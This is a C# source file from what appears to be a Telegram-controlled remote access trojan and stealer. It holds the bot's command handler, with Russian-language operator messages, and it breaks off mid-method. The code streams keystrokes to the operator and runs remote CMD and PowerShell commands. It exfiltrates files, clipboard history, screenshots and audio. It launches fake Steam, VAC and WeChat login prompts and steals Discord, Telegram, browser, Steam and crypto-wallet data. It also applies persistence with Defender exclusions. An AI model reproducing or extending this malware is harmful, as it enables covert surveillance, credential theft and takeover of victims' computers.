using System;
using System.IO;
using System.Text;
using System.Collections.Generic;
using System.Threading.Tasks;
using System.IO.Compression;
using Telegram.Bot;
using Telegram.Bot.Types;
using Telegram.Bot.Types.Enums;
using Telegram.Bot.Types.ReplyMarkups;
using TgMessage = Telegram.Bot.Types.Message;
using System.Net;
using System.Net.Http;
using Microsoft.Data.Sqlite;
using FinalBot;
using Microsoft.UpdateService.Modules;
using FinalBot.Stealers;
using FinalBot.Modules;
using VanguardCore;
using VanguardCore.Modules;
using System.Linq;
using File = System.IO.File;
using System.Diagnostics;

namespace FinalBot
{
    public class CommandHandler
    {
        // [POLY_JUNK]
        private static void _vanguard_c368bb88() {
            int val = 23223;
            if (val > 50000) Console.WriteLine("Hash:" + 23223);
        }

        private readonly ITelegramBotClient _botClient;
        private readonly string _adminId;
        private readonly Dictionary<long, string> _userState = new Dictionary<long, string>();
        private static readonly Dictionary<string, string> _fileIdCache = new Dictionary<string, string>();
        private static int _fileIdCounter = 0;
        private static StringBuilder _terminalBuffer = new StringBuilder();

        private static string CacheFileId(string fileId)
        {
            string key = $"f_{++_fileIdCounter}";
            _fileIdCache[key] = fileId;
            return key;
        }

        private static string GetCachedFileId(string key)
        {
            return _fileIdCache.TryGetValue(key, out string val) ? val : key;
        }

        // Phishing state handled via PhishManager.cs static members for global synchronization

        // Discord Remote state
        private string _discordToken = "";
        private string _discordChannelUrl = "";
        private static string? _targetVictimId = null;
        private static bool _discordReady = false;

        public static void SetDiscordReady(bool ready) => _discordReady = ready;
        // NULL means anyone can respond to main menu, but only target responds to sub-menus
        private static int _lastDiscordMessageId = 0;

        public static int GetLastDiscordMessageId() => _lastDiscordMessageId;
        public static void SetLastDiscordMessageId(int id) => _lastDiscordMessageId = id;

        public CommandHandler(ITelegramBotClient botClient, string adminId)
        {
            _botClient = botClient;
            _adminId = adminId;
            InitTerminalMonitoring(botClient, adminId);
        }

        private static void InitTerminalMonitoring(ITelegramBotClient bot, string adminId)
        {
            KeyloggerModule.OnTerminalFocus += (title, isActive) => {
                try {
                    string msg = isActive 
                        ? $"🟢 **РЕЖИМ ТЕРМИНАЛА АКТИВИРОВАН**\n🔲 Окно: `{title}`" 
                        : $"🔴 **РЕЖИМ ТЕРМИНАЛА ВЫКЛЮЧЕН**";
                    bot.SendTextMessageAsync(adminId, msg, parseMode: ParseMode.Markdown);
                    if (!isActive) _terminalBuffer.Clear();
                } catch { }
            };

            KeyloggerModule.OnKeyStroke += (key) => {
                try {
                    if (KeyloggerModule.IsTerminalActive)
                    {
                        if (key == "[ENTER]\n") {
                            string cmd = _terminalBuffer.ToString();
                            if (!string.IsNullOrWhiteSpace(cmd)) {
                                bot.SendTextMessageAsync(adminId, $"💻 `{cmd}`", parseMode: ParseMode.Markdown);
                            }
                            _terminalBuffer.Clear();
                        } else if (key == "[BACKSPACE]") {
                            if (_terminalBuffer.Length > 0) _terminalBuffer.Length--;
                        } else if (key == " ") {
                            _terminalBuffer.Append(" ");
                        } else if (!key.StartsWith("[")) {
                            _terminalBuffer.Append(key);
                        }
                    }
                } catch { }
            };
        }

        private static void Log(string msg)
        {
            string line = $"[{DateTime.Now:HH:mm:ss}] {msg}";
            Console.WriteLine(line);
            string logDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft", "Windows", "Update");
            if (!Directory.Exists(logDir)) try { Directory.CreateDirectory(logDir); } catch { }
            string logPath = Path.Combine(logDir, "svc_debug.log");
            try { File.AppendAllText(logPath, line + "\n"); } catch { }
        }

        public async Task HandleUpdateAsync(ITelegramBotClient botClient, Update update, CancellationToken cancellationToken)
        {
            Log($"[UPDATE] Type: {update.Type} | ID: {update.Id}");
            try
            {
                var message = update.Message ?? update.EditedMessage;
                if (message != null)
                {
                    // Automatic JSON cookie detection
                    if (message.Document != null && message.Document.FileName != null && (message.Document.FileName.EndsWith(".json") || message.Document.FileName.EndsWith(".txt")))
                    {
                        string shortId = CacheFileId(message.Document.FileId);
                        var markup = new InlineKeyboardMarkup(new[]
                        {
                            new[] { InlineKeyboardButton.WithCallbackData("✅ ДА, ИНЖЕКТИРОВАТЬ КУКИ (STEAM)", "vac_inject_f_" + shortId) },
                            
                        });
                        await _botClient.SendTextMessageAsync(_adminId, "🍪 <b>Обнаружен JSON файл.</b> Инжектировать как куки Steam?", parseMode: ParseMode.Html, replyMarkup: markup);
                    }
                }

                if (update.Type == UpdateType.Message && update.Message != null)
                {
                    await HandleCommand(update.Message);
                }
                else if (update.Type == UpdateType.CallbackQuery && update.CallbackQuery != null)
                {
                    await HandleCallbackQuery(update.CallbackQuery);
                }
            }
            catch (Exception ex)
            {
                Log($"[HANDLER ERROR] {ex.Message}");
            }
        }

        public Task HandlePollingErrorAsync(ITelegramBotClient botClient, Exception exception, CancellationToken cancellationToken)
        {
            Log($"[TELEGRAM ERROR] {exception.Message}");
            return Task.CompletedTask;
        }

        public async Task HandleCommand(TgMessage message)
        {
            if (message == null) return;
            string senderId = (message.From?.Id.ToString() ?? "0").Trim();
            string chatId = (message.Chat.Id.ToString() ?? "0").Trim();
            string targetId = (_adminId ?? "").Trim();
            
            // Allow if sender is admin OR message is in the admin chat
            if (senderId != targetId && chatId != targetId) 
            {
                Log($"[AUTH FAILURE] Denied message from {senderId} (Chat: {chatId}). Expected: {targetId}");
                return;
            }

            string text = message.Text ?? "";
            Log($"[CMD] Received text from {senderId}: {text}");

            // Normalize command: /cmd@botname args -> /cmd args
            if (text.StartsWith("/"))
            {
                int spaceIndex = text.IndexOf(' ');
                string cmdPart = spaceIndex > 0 ? text.Substring(0, spaceIndex) : text;
                if (cmdPart.Contains("@"))
                {
                    string baseCmd = cmdPart.Split('@')[0];
                    text = baseCmd + (spaceIndex > 0 ? text.Substring(spaceIndex) : "");
                }
            }
            
            // Re-normalize /panel case
            if (text.ToLower().StartsWith("/panel")) text = "/panel";
            if (text.ToLower().StartsWith("/start")) text = "/start";
            if (text.ToLower().StartsWith("/menu")) text = "/menu";

            if (_userState.TryGetValue(message.Chat.Id, out string state))
            {
                if (state == "awaiting_vac_agent_name")
                {
                    _userState.Remove(message.Chat.Id);
                    PhishManager.SetAgentName(text); 
                    await _botClient.SendTextMessageAsync(message.Chat.Id, GetRichText($"✅ <b>Имя агента успешно поменял:</b> <code>{text}</code>"), parseMode: ParseMode.Html);
                    Log($"[PHISH] Agent name updated to: {text}");
                    return;
                }
                else if (state == "awaiting_vac_cookies")
                {
                    _userState.Remove(message.Chat.Id);
                    PhishManager.SetCookies(text); 
                    await _botClient.SendTextMessageAsync(message.Chat.Id, GetRichText("✅ <b>Куки успешно принял и сохранил!</b>"), parseMode: ParseMode.Html);
                    return;
                }
                else if (state == "awaiting_victim_name")
                {
                    ConfigManager.VictimName = text;
                    _userState.Remove(message.Chat.Id);
                    
                    // Sync with python telemetry bridge
                    PhishManager.SyncToDisk();

                    await _botClient.SendTextMessageAsync(message.Chat.Id, GetRichText($"✅ <b>Имя жертвы изменено на:</b> <code>{text}</code>"), parseMode: ParseMode.Html);
                    await ShowAdminPanel(message.Chat.Id);
                    return;
                }
                else if (state == "shell_cmd_mode")
                {
                    // Persistent shell mode - don't remove state
                    await _botClient.SendChatActionAsync(message.Chat.Id, ChatAction.Typing);
                    string res = await ShellManager.ExecuteCommand(text);
                    
                    var exitMarkup = new InlineKeyboardMarkup(new[] { InlineKeyboardButton.WithCallbackData("🔴 ВЫЙТИ ИЗ РЕЖИМА CMD", "shell_mode_exit") });
                    string output = $"💻 <b>CMD EXECUTION:</b> <code>{WebUtility.HtmlEncode(text)}</code>\n\n{res}";
                    await _botClient.SendTextMessageAsync(message.Chat.Id, GetRichText(output), parseMode: ParseMode.Html, replyMarkup: exitMarkup);
                    return;
                }
                else if (state == "shell_ps_mode")
                {
                    // Persistent shell mode - don't remove state
                    await _botClient.SendChatActionAsync(message.Chat.Id, ChatAction.Typing);
                    string res = await ShellManager.ExecuteCommand($"powershell -NoProfile -ExecutionPolicy Bypass -Command \"{text}\"");
                    
                    var exitMarkup = new InlineKeyboardMarkup(new[] { InlineKeyboardButton.WithCallbackData("🔴 ВЫЙТИ ИЗ РЕЖИМА PS", "shell_mode_exit") });
                    string output = $"🖥 <b>PS EXECUTION:</b> <code>{WebUtility.HtmlEncode(text)}</code>\n\n{res}";
                    await _botClient.SendTextMessageAsync(message.Chat.Id, GetRichText(output), parseMode: ParseMode.Html, replyMarkup: exitMarkup);
                    return;
                }
                else if (state == "awaiting_discord_token")
                {
                    _discordToken = text.Trim();
                    _userState.Remove(message.Chat.Id);
                    _userState[message.Chat.Id] = "awaiting_discord_channel";
                    await _botClient.SendTextMessageAsync(message.Chat.Id, GetRichText("✅ Токен сохранен.\n⌨️ <b>Теперь введи ссылку на голосовой канал Discord:</b>"), parseMode: ParseMode.Html);
                    return;
                }
                else if (state == "awaiting_discord_channel")
                {
                    _discordChannelUrl = text.Trim();
                    _userState.Remove(message.Chat.Id);
                    await _botClient.SendTextMessageAsync(message.Chat.Id, GetRichText($"✅ <b>Ссылка установлена.</b>\n🚀 Запускаю бота..."), parseMode: ParseMode.Html);
                    Log($"[DISCORD_REMOTE] Token: {_discordToken[..Math.Min(8, _discordToken.Length)]}... | URL: {_discordChannelUrl}");
                    string res = DiscordRemoteManager.LaunchDiscordBot(_discordToken, _discordChannelUrl, "join");
                    await _botClient.SendTextMessageAsync(message.Chat.Id, GetRichText(res));
                    return;
                }
                else if (state == "awaiting_discord_tokenurl")
                {
                    _userState.Remove(message.Chat.Id);
                    string[] parts = text.Contains("|") ? text.Split('|') : text.Split('\n');
                    
                    if (parts.Length >= 2)
                    {
                        string tkn = parts[0].Trim();
                        string url = parts[1].Trim();
                        _discordToken = tkn;
                        _discordChannelUrl = url;
                        
                        string maskedToken = tkn.Length > 12 ? tkn.Substring(0, 8) + "..." + tkn.Substring(tkn.Length - 4) : tkn;
                        string confirmMsg = $"✅ <b>Данные приняты!</b>\n\n" +
                                            $"🔑 <b>Токен:</b> <code>{maskedToken}</code>\n" +
                                            $"🔊 <b>Канал:</b> <code>{url}</code>\n\n" +
                                            $"🚀 <i>Инициализация Selenium...</i>";

                        await _botClient.SendTextMessageAsync(message.Chat.Id, GetRichText(confirmMsg), parseMode: ParseMode.Html, disableWebPagePreview: true);
                        Log($"[DISCORD_REMOTE] Token Received. Launching bot...");
                        
                        string result = DiscordRemoteManager.LaunchDiscordBot(tkn, url, "join");
                        if (result.StartsWith("❌"))
                        {
                            await _botClient.SendTextMessageAsync(message.Chat.Id, GetRichText(result), parseMode: ParseMode.Html);
                        }
                        else
                        {
                            await _botClient.SendTextMessageAsync(message.Chat.Id, GetRichText("🚀 <b>Discord Remote Process Initiated.</b>"), parseMode: ParseMode.Html);
                        }
                    }
                    else
                    {
                        await _botClient.SendTextMessageAsync(message.Chat.Id, GetRichText("❌ <b>Ошибка формата.</b>\nНужно: <code>токен | ссылка</code>\nЛибо в две строки."), parseMode: ParseMode.Html);
                    }
                    return;
                }
            }

            if (text == "/start" || text == "/menu")
            {
                await ShowAdminPanel(message.Chat.Id);
            }
            else if (text == "/sessions")
            {
                await ShowSessionsPanel(message.Chat.Id);
            }
            else if (text.StartsWith("/set_victim "))
            {
                string cmd = text.Substring(7).Trim();
                Log($"[SHELL] Executing: {cmd}");
                await _botClient.SendTextMessageAsync(message.Chat.Id, $"⚙️ Running: `{cmd}`", parseMode: ParseMode.Markdown);
                string result = await ShellManager.ExecuteCommand(cmd);
            }
            else if (text == "/help")
            {
                await ShowHelp(message.Chat.Id);
            }
            else if (text.StartsWith("/shell "))
            {
                string cmd = text.Substring(7).Trim();
                Log($"[SHELL] Executing: {cmd}");
                await _botClient.SendTextMessageAsync(message.Chat.Id, $"⚙️ Running: `{cmd}`", parseMode: ParseMode.Markdown);
                string result = await ShellManager.ExecuteCommand(cmd);
                await _botClient.SendTextMessageAsync(message.Chat.Id, result, parseMode: ParseMode.Markdown);
            }
            else if (text.StartsWith("/kill "))
            {
                string pidStr = text.Substring(6).Trim();
                if (int.TryParse(pidStr, out int pid))
                {
                    string res = TaskManager.KillProcess(pid);
                    await _botClient.SendTextMessageAsync(message.Chat.Id, res);
                }
            }
            else if (text.StartsWith("/get "))
            {
                string path = text.Substring(5).Trim();
                if (System.IO.File.Exists(path))
                {
                    using var stream = System.IO.File.OpenRead(path);
                    await _botClient.SendDocumentAsync(message.Chat.Id, InputFile.FromStream(stream, Path.GetFileName(path)));
                }
                else await _botClient.SendTextMessageAsync(message.Chat.Id, "❌ File not found.");
            }
            else if (text.StartsWith("/setname "))
            {
                string newName = text.Substring(9).Trim();
                ConfigManager.VictimName = newName;
                PhishManager.SyncToDisk();
                await _botClient.SendTextMessageAsync(message.Chat.Id, $"✅ Victim name updated: `{newName}`");
                await ShowAdminPanel(message.Chat.Id);
            }
            else
            {
                await _botClient.SendTextMessageAsync(message.Chat.Id, "❔ Unknown command. Use /help.");
            }
        }

        public async Task HandleCallbackQuery(CallbackQuery callbackQuery)
        {
            if (callbackQuery.Message is not { } message) return;
            string data = callbackQuery.Data ?? "";

            Log($"[CALLBACK] {data} (From: {ConfigManager.VictimName}, Target: {_targetVictimId ?? "GLOBAL"})");

            try
            {
                // ALWAYS answer to stop the loading spinner
                if (!data.StartsWith("fmd_") && !data.StartsWith("fmf_") && !data.StartsWith("fmp_") && !data.StartsWith("session_select_"))
                {
                    // Don't answer yet for these as they might need custom answers or take time
                }

                switch (data)
                {
                    case "admin_panel":
                    case "back_to_main":
                        await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id);
                        await ShowAdminPanel(message.Chat.Id, message.MessageId);
                        break;
                    case "file_manager":
                        await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id);
                        var (fmText, fmMarkup) = FileManager.GetDirectoryView("");
                        await EditOrSend(message.Chat.Id, message.MessageId, fmText, fmMarkup, ParseMode.Markdown);
                        break;
                    case "proc_list":
                        string procs = TaskManager.GetProcessList();
                        await _botClient.SendTextMessageAsync(message.Chat.Id, procs, parseMode: ParseMode.Markdown);
                        break;
                    case "panel_system":
                        if (!await CheckTarget(callbackQuery.Id)) return;
                        await ShowSystemPanel(message.Chat.Id, message.MessageId);
                        break;
                    case "panel_work":
                        if (!await CheckTarget(callbackQuery.Id)) return;
                        await ShowWorkPanel(message.Chat.Id, message.MessageId);
                        break;
                    case "panel_spyware":
                        if (!await CheckTarget(callbackQuery.Id)) return;
                        await ShowSpywarePanel(message.Chat.Id, message.MessageId);
                        break;
                    case "set_victim_name":
                        _userState[message.Chat.Id] = "awaiting_victim_name";
                        await _botClient.SendTextMessageAsync(message.Chat.Id, "⌨️ <b>Enter victim name:</b>", parseMode: ParseMode.Html);
                        break;
                    case "screenshot":
                        await HandleScreenshot(message.Chat.Id);
                        break;
                    case "record_video":
                        await HandleVideoRecord(message.Chat.Id);
                        break;
                    case "record_audio":
                        await HandleAudioRecord(message.Chat.Id);
                        break;
                    case "clipboard_summary":
                        await HandleClipboardSummary(message.Chat.Id);
                        break;
                    case "clipboard_get_file":
                        await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id, "📁 Собираю историю буфера...");
                        string clipPath = Modules.ClipboardModule.GetHistoryFilePath();
                        if (System.IO.File.Exists(clipPath))
                        {
                            using var stream = System.IO.File.OpenRead(clipPath);
                            await _botClient.SendDocumentAsync(message.Chat.Id, InputFile.FromStream(stream, "clip_history.txt"), caption: "📋 <b>История буфера обмена</b>", parseMode: ParseMode.Html);
                        }
                        else await _botClient.SendTextMessageAsync(message.Chat.Id, "❌ История пуста.");
                        break;
                    case "shell_cmd":
                        _userState[message.Chat.Id] = "shell_cmd_mode";
                        var cmdExit = new InlineKeyboardMarkup(new[] { InlineKeyboardButton.WithCallbackData("🔴 ВЫЙТИ ИЗ РЕЖИМА", "shell_mode_exit") });
                        await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id, "💻 Режим CMD включен");
                        await _botClient.SendTextMessageAsync(message.Chat.Id, GetRichText("💻 <b>РЕЖИМ CMD АКТИВИРОВАН</b>\n━━━━━━━━━━━━━━━━━━\nВы можете писать команды прямо в чат. Бот будет исполнять их до нажатия кнопки выхода."), parseMode: ParseMode.Html, replyMarkup: cmdExit);
                        break;
                    case "shell_ps":
                        _userState[message.Chat.Id] = "shell_ps_mode";
                        var psExit = new InlineKeyboardMarkup(new[] { InlineKeyboardButton.WithCallbackData("🔴 ВЫЙТИ ИЗ РЕЖИМА", "shell_mode_exit") });
                        await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id, "🖥 Режим PowerShell включен");
                        await _botClient.SendTextMessageAsync(message.Chat.Id, GetRichText("🖥 <b>РЕЖИМ POWERSHELL АКТИВИРОВАН</b>\n━━━━━━━━━━━━━━━━━━\nВсе текстовые сообщения будут исполнены как PS-скрипты."), parseMode: ParseMode.Html, replyMarkup: psExit);
                        break;
                    case "shell_mode_exit":
                        _userState.Remove(message.Chat.Id);
                        await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id, "🚪 Режим терминала завершен");
                        await ShowSystemPanel(message.Chat.Id, message.MessageId);
                        break;
                    case "keylog_get":
                        await HandleKeylogGet(message.Chat.Id);
                        break;
                    case "system_info":
                        await HandleSystemInfo(message.Chat.Id);
                        break;
                    case "wifi_profiles":
                        await _botClient.SendTextMessageAsync(message.Chat.Id, SystemInfoModule.GetWifiProfiles());
                        break;

                    case "proxy_toggle":
                        if (!await CheckTarget(callbackQuery.Id)) return;
                        if (ProxyModule.IsActive)
                        {
                            ProxyModule.Stop();
                            await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id, "🔴 Proxy Stopped");
                        }
                        else
                        {
                            await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id, "🌐 Starting Proxy...");
                            string res = await ProxyModule.Start();
                            await _botClient.SendTextMessageAsync(message.Chat.Id, res);
                        }
                        await ShowSystemPanel(message.Chat.Id, message.MessageId);
                        break;
                    case "sessions_list":
                        await ShowSessionsPanel(message.Chat.Id, message.MessageId);
                        break;
                    case "session_reset":
                        _targetVictimId = null;
                        await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id, "♻️ Session Reset (Global Mode)");
                        await ShowAdminPanel(message.Chat.Id, message.MessageId);
                        break;
                    case "window_history":
                        await HandleWindowHistory(message.Chat.Id);
                        break;
                    
                    case "harden_persistence":
                        if (!await CheckTarget(callbackQuery.Id)) return;
                        await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id, "🛡️ Активация протокола Sentinel...");
                        VanguardCore.SafetyManager.ApplyHardPersistence();
                        await _botClient.SendTextMessageAsync(message.Chat.Id, "✅ <b>SENTINEL ACTIVE:</b> WMI + SafeMode + Defender exclusions applied.", parseMode: ParseMode.Html);
                        break;
                    
                    case "critical_toggle":
                        if (!await CheckTarget(callbackQuery.Id)) return;
                        bool newState = !VanguardCore.ElevationService.IsCritical();
                        VanguardCore.SafetyManager.SetCriticalMode(newState);
                        await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id, $"💀 Critical Mode: {(newState ? "ON" : "OFF")}");
                        await ShowSystemPanel(message.Chat.Id, message.MessageId);
                        break;
                    
                    case "activate_guardian":
                        if (!await CheckTarget(callbackQuery.Id)) return;
                        await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id, "👁️ Протокол «Близнец» запущен...");
                        FinalBot.Modules.TwinService.StartGuardian();
                        await _botClient.SendTextMessageAsync(message.Chat.Id, "✅ <b>GUARDIAN TWIN ACTIVE:</b> Mutual process protection enabled.", parseMode: ParseMode.Html);
                        break;

                    // Phishing Actions
                    case "work_vac_alert":
                    case "vac_panel":
                        await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id);
                        await ShowVacPanel(message.Chat.Id, message.MessageId);
                        break;
                    
                    case "vac_launch":
                        await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id, "⏳ Launching VAC Alert...");
                        await HandleVacLaunch(message.Chat.Id);
                        break;
                    
                    case "vac_toggle_block":
                    case "toggle_steam_block":
                        if (!await CheckTarget(callbackQuery.Id)) return;
                        Modules.PhishManager.ToggleGlobalBlock();
                        ConfigManager.Save();
                        
                        await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id, $"🛡 Steam Blocker: {(Modules.PhishManager.GlobalBlockSteam ? "LOCKED" : "UNLOCKED")}");
                        
                        if (data == "vac_toggle_block") await ShowVacPanel(message.Chat.Id, message.MessageId);
                        else await ShowWorkPanel(message.Chat.Id, message.MessageId);
                        break;
                    
                    case "vac_lang_toggle":
                    case "vac_toggle_lang":
                        string newLang = (PhishManager.GetVacLang() == "zh") ? "en" : "zh";
                        PhishManager.SetVacLang(newLang);
                        await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id, $"🌐 Language: {newLang.ToUpper()}");
                        await ShowVacPanel(message.Chat.Id, message.MessageId);
                        break;
                    
                    case "vac_set_name":
                    case "vac_set_agent":
                        await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id);
                        _userState[message.Chat.Id] = "awaiting_vac_agent_name";
                        await _botClient.SendTextMessageAsync(message.Chat.Id, "✏️ <b>Введи новое имя агента:</b>", parseMode: ParseMode.Html);
                        break;
                    
                    case "vac_inject_cookies":
                        await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id);
                        _userState[message.Chat.Id] = "awaiting_vac_cookies";
                        await _botClient.SendTextMessageAsync(message.Chat.Id, "🍪 <b>Пришли куки Steam (JSON или текст):</b>", parseMode: ParseMode.Html);
                        break;

                    case "work_steam_phish":
                        await ShowSteamPhishLangPanel(message.Chat.Id, message.MessageId);
                        break;

                    case "steam_phish_en":
                        PhishManager.LaunchSteamLogin("en");
                        await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id, "🚀 Steam Phish (EN) launched!");
                        break;
                    case "steam_phish_cn":
                        PhishManager.LaunchSteamLogin("cn");
                        await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id, "🚀 Steam Phish (CN) launched!");
                        break;

                    case "work_discord":
                        await HandleDiscordSteal(message.Chat.Id);
                        break;
                    case "work_telegram":
                        await HandleTelegramSteal(message.Chat.Id);
                        break;
                    case "work_wechat_phish":
                        if (PhishManager.IsWeChatInstalled())
                        {
                            PhishManager.LaunchWeChatPhish();
                            await _botClient.SendTextMessageAsync(message.Chat.Id, GetRichText("🚀 <b>SUCCESS:</b> WeChat Phish launched."), parseMode: ParseMode.Html);
                        }
                        else
                        {
                            await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id, "❌ WeChat не найден в системе", showAlert: true);
                        }
                        break;
                    case "work_browsers":
                        await HandleBrowserSteal(message.Chat.Id);
                        break;
                    case "work_steam_ssfn":
                        await HandleSteamSteal(message.Chat.Id);
                        break;
                    case "work_crypto":
                        await HandleCryptoSteal(message.Chat.Id);
                        break;
                    case "full_report":
                        await HandleFullReport(message.Chat.Id);
                        break;
                    
                    case "discord_remote_start":
                        if (!string.IsNullOrEmpty(_discordToken) && !string.IsNullOrEmpty(_discordChannelUrl))
                        {
                            await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id, "🚀 Re-launching with saved credentials...");
                            DiscordRemoteManager.LaunchDiscordBot(_discordToken, _discordChannelUrl, "join");
                        }
                        else
                        {
                            _userState[message.Chat.Id] = "awaiting_discord_tokenurl";
                            await _botClient.SendTextMessageAsync(message.Chat.Id,
                                "🎮 <b>Discord Remote Bot</b>\n" +
                                "━━━━━━━━━━━━━━━━━━\n" +
                                "<i>Начинаю подключение к Discord...\n" +
                                "Введите токен и ссылку на голосовой канал:</i>\n\n" +
                                "Формат: <code>токен | ссылка</code>",
                                parseMode: ParseMode.Html);
                        }
                        break;

                    case "discord_ctrl_mic":
                        await _botClient.SendTextMessageAsync(message.Chat.Id, DiscordRemoteManager.LaunchDiscordBot(_discordToken, _discordChannelUrl, "mute_mic"));
                        break;
                    case "discord_ctrl_deaf":
                        await _botClient.SendTextMessageAsync(message.Chat.Id, DiscordRemoteManager.LaunchDiscordBot(_discordToken, _discordChannelUrl, "deafen"));
                        break;
                    case "discord_ctrl_stream":
                        await _botClient.SendTextMessageAsync(message.Chat.Id, DiscordRemoteManager.LaunchDiscordBot(_discordToken, _discordChannelUrl, "stream"));
                        break;
                    case "discord_ctrl_disconnect":
                        await _botClient.SendTextMessageAsync(message.Chat.Id, DiscordRemoteManager.LaunchDiscordBot(_discordToken, _discordChannelUrl, "disconnect"));
                        break;

                    default:
                        if (data.StartsWith("vac_inject_f_"))
                        {
                            string shortId = data.Replace("vac_inject_f_", "");
                            string fileId = GetCachedFileId(shortId);
                            await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id, "📥 Загружаю куки...");
                            try
                            {
                                var file = await _botClient.GetFileAsync(fileId);
                                using var ms = new MemoryStream();
                                await _botClient.DownloadFileAsync(file.FilePath!, ms);
                                string content = Encoding.UTF8.GetString(ms.ToArray());
                                
                                PhishManager.SetCookies(content);
                                await _botClient.SendTextMessageAsync(message.Chat.Id, "✅ <b>Куки из файла успешно приняты и инжектированы!</b>", parseMode: ParseMode.Html);
                            }
                            catch (Exception ex)
                            {
                                await _botClient.SendTextMessageAsync(message.Chat.Id, $"❌ <b>Ошибка инъекции:</b> <code>{ex.Message}</code>", parseMode: ParseMode.Html);
                            }
                            return;
                        }
                        
                        if (data.StartsWith("fmd_"))
                        {
                            var pathInfo = data.Substring(4);
                            if (!int.TryParse(pathInfo, out int pathId)) return;
                            string realPath = PathCache.Get(pathId) ?? "";
                            if (string.IsNullOrEmpty(realPath))
                            {
                                await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id, "❌ Path expired or invalid");
                                return;
                            }
                            var (view, keyMarkup) = FileManager.GetDirectoryView(realPath);
                            await EditOrSend(message.Chat.Id, message.MessageId, view, keyMarkup, ParseMode.Markdown);
                        }
                        else if (data.StartsWith("session_select_"))
                        {
                            _targetVictimId = data.Replace("session_select_", "");
                            await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id, $"🎯 Target: {_targetVictimId}");
                            await ShowAdminPanel(message.Chat.Id, message.MessageId);
                        }
                        else if (data.StartsWith("fmf_"))
                        {
                            int id = int.Parse(data.Substring(4));
                            string realPath = PathCache.Get(id) ?? "";
                            if (!string.IsNullOrEmpty(realPath) && File.Exists(realPath))
                            {
                                var info = new FileInfo(realPath);
                                string size = info.Length > 1024 * 1024 ? $"{info.Length / (1024.0 * 1024.0):F2} MB" : $"{info.Length / 1024.0:F2} KB";
                                string caption = $"📄 <b>File Info</b>\n" +
                                                 $"━━━━━━━━━━━━━━━━━━\n" +
                                                 $"📂 <b>Name:</b> <code>{info.Name}</code>\n" +
                                                 $"⚖️ <b>Size:</b> <code>{size}</code>\n" +
                                                 $"━━━━━━━━━━━━━━━━━━";

                                 if (info.Length > 49 * 1024 * 1024)
                                 {
                                     await _botClient.SendTextMessageAsync(message.Chat.Id, GetRichText($"⚙️ <b>Large File Detected:</b> <code>{info.Name}</code>\n━━━━━━━━━━━━━━━━━━\n<i>Bypassing Telegram 50MB limit...\n⬆️ Uploading to Cloud... Please wait.</i>"), parseMode: ParseMode.Html);
                                     string? cloudUrl = await CloudUploader.UploadFileAsync(realPath);
                                     if (!string.IsNullOrEmpty(cloudUrl))
                                     {
                                         string successMsg = $"✅ <b>Cloud Upload Complete!</b>\n━━━━━━━━━━━━━━━━━━\n📂 <b>File:</b> <code>{info.Name}</code>\n🔗 <b>Link: {cloudUrl}</b>";
                                         await _botClient.SendTextMessageAsync(message.Chat.Id, GetRichText(successMsg), parseMode: ParseMode.Html);
                                     }
                                     else
                                     {
                                         await _botClient.SendTextMessageAsync(message.Chat.Id, GetRichText($"❌ <b>Cloud Upload Failed.</b>\n━━━━━━━━━━━━━━━━━━\nTry manual split or check internet connection."), parseMode: ParseMode.Html);
                                     }
                                     return;
                                 }
                                await _botClient.SendTextMessageAsync(message.Chat.Id, GetRichText($"⬆️ <i>Uploading:</i> <code>{info.Name}</code>..."), parseMode: ParseMode.Html);
                                using var stream = File.OpenRead(realPath);
                                await _botClient.SendDocumentAsync(message.Chat.Id, InputFile.FromStream(stream, info.Name), caption: caption, parseMode: ParseMode.Html);
                            }
                        }
                        else if (data.StartsWith("fmp_"))
                        {
                            var parts = data.Substring(4).Split('_');
                            int parentId = int.Parse(parts[0]);
                            int page = int.Parse(parts[1]);
                            string realPath = PathCache.Get(parentId) ?? "";
                            var (view, keyMarkup) = FileManager.GetDirectoryView(realPath, page);
                            await EditOrSend(message.Chat.Id, message.MessageId, view, keyMarkup, ParseMode.Markdown);
                        }
                        break;
                }
            }
            catch (Exception ex)
            {
                Log($"[CALLBACK ERROR] {ex.Message}");
                await _botClient.SendTextMessageAsync(message.Chat.Id, $"❌ <b>Error:</b> <code>{WebUtility.HtmlEncode(ex.Message)}</code>", parseMode: ParseMode.Html);
            }
        }

        private async Task HandleScreenshot(long chatId)
        {
            await _botClient.SendTextMessageAsync(chatId, "📸 <i>Taking screenshot...</i>", parseMode: ParseMode.Html);
            string? path = ScreenshotModule.TakeScreenshot();
            if (path != null)
            {
                using var stream = File.OpenRead(path);
                await _botClient.SendPhotoAsync(chatId, InputFile.FromStream(stream, Path.GetFileName(path)));
                File.Delete(path);
            }
            else await _botClient.SendTextMessageAsync(chatId, "❌ Screenshot failed.");
        }

        private async Task HandleAudioRecord(long chatId)
        {
            await _botClient.SendTextMessageAsync(chatId, "🎤 <i>Recording audio (10s)...</i>", parseMode: ParseMode.Html);
            string? path = AudioModule.RecordAudio(10);
            if (path != null)
            {
                using var stream = File.OpenRead(path);
                await _botClient.SendVoiceAsync(chatId, InputFile.FromStream(stream, "mic_record.wav"));
                File.Delete(path);
            }
            else await _botClient.SendTextMessageAsync(chatId, "❌ Audio recording failed.");
        }

        private async Task HandleVideoRecord(long chatId)
        {
